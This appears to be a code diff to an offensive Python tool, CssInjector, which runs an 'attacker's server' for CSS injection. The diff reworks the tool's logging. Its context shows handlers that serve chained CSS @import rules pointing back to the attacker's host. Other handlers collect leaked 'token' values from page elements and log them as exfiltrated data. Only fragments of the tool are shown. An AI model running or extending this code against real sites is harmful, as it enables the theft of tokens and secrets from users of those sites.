@@ -5,6 +5,7 @@ import random
 import urllib.parse
 from aiohttp import web
 import asyncio
+import datetime
 
 
 class CssInjector:
@@ -16,12 +17,15 @@ class CssInjector:
         self.counter_req = 0
 
     def log(self, status: str, message: str):
-        if status == "ok":
-            print(f"\33[0;32m[✓]\033[0m {message}")
-        elif status == "info":
-            print(f"\33[0;36m[ⓘ]\033[0m {message}")
-        elif status == "error":
-            print(f"\33[0;31m[✗]\033[0m {message}")
+        now = datetime.datetime.now()
+        if status == "server":
+            print(f"[{now.strftime("%Y-%m-%d %H:%M:%S")}] 🛠️ {message}")
+        elif status == "exfiltration":
+            print(f"[{now.strftime("%Y-%m-%d %H:%M:%S")}] 🔎 {message}")
+        elif status == "end_exfiltration":
+            print(f"[{now.strftime("%Y-%m-%d %H:%M:%S")}] ✅ {message}")
+        elif status == "connection":
+            print(f"[{now.strftime("%Y-%m-%d %H:%M:%S")}] 🌐 {message}")
 
     def set_parser(self):
         parser = argparse.ArgumentParser(
@@ -65,7 +69,7 @@ class CssInjector:
             self.app,
             port=self.port,
             print=self.log(
-                "ok", f"Attacker's server started on {args.hostname}:{args.port}"
+                "server", f"Attacker's server started on {args.hostname}:{args.port}"
             ),
         )
 
@@ -77,7 +81,7 @@ class CssInjector:
         return stri
 
     async def handle_start(self, request):
-        self.log("ok", f"Connection from {request.remote}")
+        self.log("connection", f"Connection from {request.remote}")
         self.event.set()
         return web.Response(
             text=f"@import url('//{self.hostname}:{self.port}/next?num={random.random()}'); ",
@@ -85,7 +89,10 @@ class CssInjector:
         )
 
     async def handle_end(self, request):
-        self.log("ok", f"The value exfiltrated from {self.identifier} is : {self.data}")
+        self.log(
+            "end_exfiltration",
+            f"The value exfiltrated from {self.identifier} is : {self.data}",
+        )
         self.elements.append(self.data)
         self.data = ""
         self.event.set()
@@ -104,7 +111,10 @@ class CssInjector:
         self.event.set()
         self.data = request.query.get("token")
         if self.show_details:
-            self.log("info", f"Value of element {len(self.elements)} is {self.data}")
+            self.log(
+                "exfiltration",
+                f"Exfiltrating element {len(self.elements)} : {self.data}",
+            )
         return web.Response(text="ok.", content_type="image/x-icon")
 
     async def dynamic_router_middleware(self, app, handler):
